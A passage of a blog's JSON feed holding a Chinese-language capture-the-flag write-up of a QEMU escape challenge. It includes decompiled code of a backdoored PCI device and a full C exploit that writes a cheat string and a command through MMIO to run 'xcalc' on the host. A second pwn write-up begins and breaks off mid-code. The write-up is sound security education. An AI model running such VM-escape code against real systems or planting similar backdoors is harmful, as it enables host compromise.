{
    "version": "https://jsonfeed.org/version/1",
    "title": "Squirre17 Blog • All posts by \"linux\" tag",
    "description": "中年矮臭挫油腻二刺猿死肥宅男什么都不会什么都做不来的废物",
    "home_page_url": "https://Squirre17.github.io",
    "items": [
        {
            "id": "https://squirre17.github.io/2022/09/16/a-easy-virtualization-challenge/",
            "url": "https://squirre17.github.io/2022/09/16/a-easy-virtualization-challenge/",
            "title": "a-easy-virtualization-challenge",
            "date_published": "2022-09-16T02:43:40.000Z",
            "content_html": "<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_5713A8</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = sub_70031D(a1, <span class=\"string\">&quot;pci-device&quot;</span>, <span class=\"string\">&quot;/home/wang/qemu/hw/misc/myrfid.c&quot;</span>, <span class=\"number\">369LL</span>, <span class=\"string\">&quot;rfid_class_init&quot;</span>);</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">176</span>) = qxl_reset_handler;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">184</span>) = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">208</span>) = <span class=\"number\">0x420</span>;          [<span class=\"number\">1</span>] &lt;&lt;- vendor_id</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">210</span>) = <span class=\"number\">0x1337</span>;         [<span class=\"number\">2</span>] &lt;&lt;- device_id</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">212</span>) = <span class=\"number\">0x69</span>;</span><br><span class=\"line\">  *(_WORD *)(result + <span class=\"number\">214</span>) = <span class=\"number\">0xFF</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个和源码对应关系如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">qxl_pci_class_init</span><span class=\"params\">(ObjectClass *klass, <span class=\"type\">void</span> *data)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class=\"line\">    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class=\"line\"></span><br><span class=\"line\">    k-&gt;vendor_id = REDHAT_PCI_VENDOR_ID;</span><br><span class=\"line\">    k-&gt;device_id = QXL_DEVICE_ID_STABLE;</span><br><span class=\"line\">    set_bit(DEVICE_CATEGORY_DISPLAY, dc-&gt;categories);</span><br><span class=\"line\">    dc-&gt;reset = qxl_reset_handler;</span><br><span class=\"line\">    dc-&gt;vmsd = &amp;qxl_vmstate;</span><br><span class=\"line\">    device_class_set_props(dc, qxl_properties);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>凭借着厂商 id 和设备 id 就能找到总线上的位置<br>\n登入进去看到总线</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">lspci -nvv</span></span><br><span class=\"line\">00:00.0 Class 0600: 8086:1237</span><br><span class=\"line\">00:01.3 Class 0680: 8086:7113</span><br><span class=\"line\">00:03.0 Class 0200: 8086:100e</span><br><span class=\"line\">00:01.1 Class 0101: 8086:7010</span><br><span class=\"line\">00:02.0 Class 0300: 1234:1111</span><br><span class=\"line\">00:01.0 Class 0601: 8086:7000</span><br><span class=\"line\">00:04.0 Class 00ff: 0420:1337                 [1] &lt;&lt;- 是这个b</span><br></pre></td></tr></table></figure>\n<p>然后可以看到内存中的位置✨TODO</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># cat /sys/devices/pci0000\\:00/0000:00:04.0/resource</span></span><br><span class=\"line\"><span class=\"number\">0x00000000fb000000</span> <span class=\"number\">0x00000000fbffffff</span> <span class=\"number\">0x0000000000040200</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span> <span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\">起始地址            终止地址             长度</span><br></pre></td></tr></table></figure>\n<p>注意<br>\n source 是给用户看的 而 resource0~10 之类的是给我们 open 的<br>\n source 就是整合了这些的表格</p>\n<p>从 handler 跟下去<br>\n发现有一处调用了函数数组</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">sub_571043</span><span class=\"params\">(__int64 a1, __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  sub_570742(*(_QWORD *)(a1 + <span class=\"number\">120</span>), <span class=\"number\">1LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)sub_5C950D(a1, <span class=\"number\">0LL</span>, <span class=\"number\">1LL</span>, <span class=\"number\">1LL</span>, <span class=\"number\">0LL</span>, a2) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_570635(a1 + <span class=\"number\">2688</span>, <span class=\"number\">1LL</span>, sub_570A2E, a1);</span><br><span class=\"line\">    sub_843CE1(a1 + <span class=\"number\">2520</span>);</span><br><span class=\"line\">    sub_843FBD(a1 + <span class=\"number\">2576</span>);</span><br><span class=\"line\">    sub_8449B4(a1 + <span class=\"number\">2512</span>, <span class=\"string\">&quot;rfid&quot;</span>, sub_570E7C, a1, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">    sub_31B892(a1 + <span class=\"number\">2272</span>, a1, func_array, a1, <span class=\"string\">&quot;rfid-mmio&quot;</span>, &amp;off_1000000);  [<span class=\"number\">1</span>] &lt;&lt;- vuln</span><br><span class=\"line\">    <span class=\"title function_\">sub_5C1EF2</span><span class=\"params\">(a1, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>, a1 + <span class=\"number\">2272</span>)</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>函数数组如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9720 func_array      dq offset vuln          ; DATA XREF: qxl_reset_handler+<span class=\"number\">111</span>↑o</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9728                 dq offset sub_570CEB</span><br></pre></td></tr></table></figure>\n<p>其实这就是个 op 表 里面放的是 read write 之类的<br>\n源码如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> MemoryRegionOps qxl_io_ops = &#123;</span><br><span class=\"line\">    .read = ioport_read,</span><br><span class=\"line\">    .write = ioport_write,</span><br><span class=\"line\">    .valid = &#123;</span><br><span class=\"line\">        .min_access_size = <span class=\"number\">1</span>,</span><br><span class=\"line\">        .max_access_size = <span class=\"number\">1</span>,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>终于来到了漏洞函数<br>\n只要让这个变量 和他对应的秘籍相同即可</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">vuln</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> v2; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( ((a2 &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>) != <span class=\"number\">15</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = <span class=\"built_in\">strlen</span>(cheats);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">memcmp</span>(byte_122FFE0, cheats, v2) )</span><br><span class=\"line\">      system(command);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">270438LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据这个变量可以往上 xref</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_BYTE *__fastcall <span class=\"title function_\">mmio_write</span><span class=\"params\">(__int64 a1, <span class=\"type\">unsigned</span> __int64 dst, __int64 src, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _BYTE *result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  _DWORD n[<span class=\"number\">3</span>]; <span class=\"comment\">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v6; <span class=\"comment\">// [rsp+10h] [rbp-30h]</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// [rsp+18h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// [rsp+2Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+30h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v10; <span class=\"comment\">// [rsp+34h] [rbp-Ch]</span></span><br><span class=\"line\">  __int64 v11; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = a1;</span><br><span class=\"line\">  v6 = dst;</span><br><span class=\"line\">  *(_QWORD *)&amp;n[<span class=\"number\">1</span>] = src;</span><br><span class=\"line\">  v11 = a1;</span><br><span class=\"line\">  v8 = (dst &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  idx = (dst &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  result = (_BYTE *)((dst &gt;&gt; <span class=\"number\">20</span>) &amp; <span class=\"number\">0xF</span>);</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> ( (<span class=\"type\">unsigned</span> __int64)result )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;w&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;s&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;a&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">3uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;d&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">4uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;A&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">5uLL</span>:</span><br><span class=\"line\">      result = byteArray;</span><br><span class=\"line\">      byteArray[idx] = <span class=\"string\">&#x27;B&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">6uLL</span>:</span><br><span class=\"line\">      v10 = (<span class=\"type\">unsigned</span> __int16)v6;</span><br><span class=\"line\">      result = <span class=\"built_in\">memcpy</span>(&amp;command[(<span class=\"type\">unsigned</span> __int16)v6], &amp;n[<span class=\"number\">1</span>], num);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这正是函数数组的第二个成员</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9720 func_array      dq offset mmio_read     ; DATA XREF: qxl_reset_handler+<span class=\"number\">111</span>↑o</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000F</span>E9728                 dq offset mmio_write</span><br></pre></td></tr></table></figure>\n<p>我们只需要往 cmd 里写入命令<br>\n然后写入秘籍<br>\n read 的时候就能命令执行了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/io.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;inttypes.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;./head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint64_t</span> u64;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> *mmio_mem;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">mmio_read</span><span class=\"params\">(u64 dst)</span>&#123;</span><br><span class=\"line\">  assert(dst + mmio_mem &gt; mmio_mem);</span><br><span class=\"line\">  u64 ret = *((u64 *)(mmio_mem + dst));</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;mmio_read&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// qemu中并没有真的对qemu的的内存读写</span></span><br><span class=\"line\"><span class=\"comment\">// 作为参数传递给qemu的write</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">mmio_write</span><span class=\"params\">(u64 cho, u64 idx, <span class=\"type\">char</span> chr)</span>&#123;</span><br><span class=\"line\">  u64 dst = ((cho &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">20</span>);</span><br><span class=\"line\">  u64 val = <span class=\"number\">0</span>;</span><br><span class=\"line\">  dst |= ((idx &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;dst is %d&quot;</span>, dst);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(cho == <span class=\"number\">6</span>)&#123;</span><br><span class=\"line\">    val = chr;</span><br><span class=\"line\">    dst = idx;</span><br><span class=\"line\">    dst |= ((cho &amp; <span class=\"number\">0xf</span>) &lt;&lt; <span class=\"number\">20</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *((u64 *)(mmio_mem + dst)) = val;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;mmio_write&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_cheats</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// aWwssadadbaba </span></span><br><span class=\"line\">  mmio_write(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">3</span>,<span class=\"number\">7</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">5</span>,<span class=\"number\">8</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  mmio_write(<span class=\"number\">4</span>,<span class=\"number\">11</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;write_cheats&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_cmd</span><span class=\"params\">(<span class=\"type\">char</span> *cmd)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">strlen</span>(cmd); i++)</span><br><span class=\"line\">    mmio_write(<span class=\"number\">6</span>, i, cmd[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> mmio_fd = open(</span><br><span class=\"line\">    <span class=\"string\">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,</span><br><span class=\"line\">    O_RDWR | O_SYNC</span><br><span class=\"line\">  );</span><br><span class=\"line\">  mmio_mem = mmap(</span><br><span class=\"line\">    <span class=\"number\">0</span>, <span class=\"number\">0x1000000</span>,</span><br><span class=\"line\">    PROT_WRITE | PROT_READ,</span><br><span class=\"line\">    MAP_SHARED, mmio_fd, <span class=\"number\">0</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(mmio_mem == MAP_FAILED)</span><br><span class=\"line\">    Abort(<span class=\"string\">&quot;mmap&quot;</span>);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;mmio_mem is 0x%lx&quot;</span>, mmio_mem);</span><br><span class=\"line\">  write_cheats();</span><br><span class=\"line\">  write_cmd(<span class=\"string\">&quot;xcalc&quot;</span>);<span class=\"comment\">// gnome-calculator 也行</span></span><br><span class=\"line\">  mmio_read((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">20</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "virtualization"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/09/12/2022-cakeCTF-pwn-wp/",
            "url": "https://squirre17.github.io/2022/09/12/2022-cakeCTF-pwn-wp/",
            "title": "2022-cakeCTF-pwn-wp",
            "date_published": "2022-09-12T11:39:37.000Z",
            "content_html": "<p><a href=\"https://2022.cakectf.com/tasks/1538875340/\">CakeCTF 2022</a></p>\n<h1 id=\"welkerme\"><a class=\"markdownIt-Anchor\" href=\"#welkerme\">#</a> welkerme</h1>\n<p>没开 kaslr 没开 smep<br>\n 找到 cc 和 pkc 一把梭了</p>\n<h1 id=\"strvscstr\"><a class=\"markdownIt-Anchor\" href=\"#strvscstr\">#</a> str.vs.cstr</h1>\n<p>c++ 简单溢出<br>\n没开 pie 和 relro</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span 